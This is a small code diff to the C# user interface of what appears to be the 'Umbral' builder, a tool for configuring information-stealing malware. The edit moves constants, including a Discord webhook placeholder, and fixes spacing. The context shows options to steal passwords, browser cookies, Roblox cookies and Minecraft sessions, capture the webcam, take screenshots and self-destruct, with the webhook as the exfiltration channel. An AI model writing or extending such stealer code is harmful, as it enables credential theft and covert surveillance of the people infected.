@@ -8,6 +8,10 @@ namespace Umbral.builder.User_Controls
     public partial class GeneralTab : UserControl
     {
 
+        private const string WebhookPlaceholder = "https://discord.com/api/webhooks/1234567890/abcdefhgijklmnopqrstuvwxyz";
+        private const string WebhookCheckButtonPlaceHolderEnabled = "Check Webhook";
+        private const string WebhookCheckButtonPlaceHolderDisabled = "Checking...";
+
         public static bool IsWebhookValid;
         public static string Webhook;
 
@@ -22,10 +26,6 @@ namespace Umbral.builder.User_Controls
         public static bool TakeScreenshot;
         public static bool SelfDestruct;
         public static bool CaptureWebcam;
-
-        private const string WebhookPlaceholder = "https://discord.com/api/webhooks/1234567890/abcdefhgijklmnopqrstuvwxyz";
-        private const string WebhookCheckButtonPlaceHolderEnabled = "Check Webhook";
-        private const string WebhookCheckButtonPlaceHolderDisabled = "Checking...";
 
         public GeneralTab()
         {
@@ -133,7 +133,7 @@ namespace Umbral.builder.User_Controls
                 StealPasswords = checkBox.Checked;
             else if (checkBox.Equals(StealCookiesCheckBox))
                 StealCookies = checkBox.Checked;
-            else if(checkBox.Equals(StealRobloxCookiesCheckBox))
+            else if (checkBox.Equals(StealRobloxCookiesCheckBox))
                 StealRobloxCookies = checkBox.Checked;
             else if (checkBox.Equals(StealMinecraftSessionCheckBox))
                 StealMinecraftSession = checkBox.Checked;
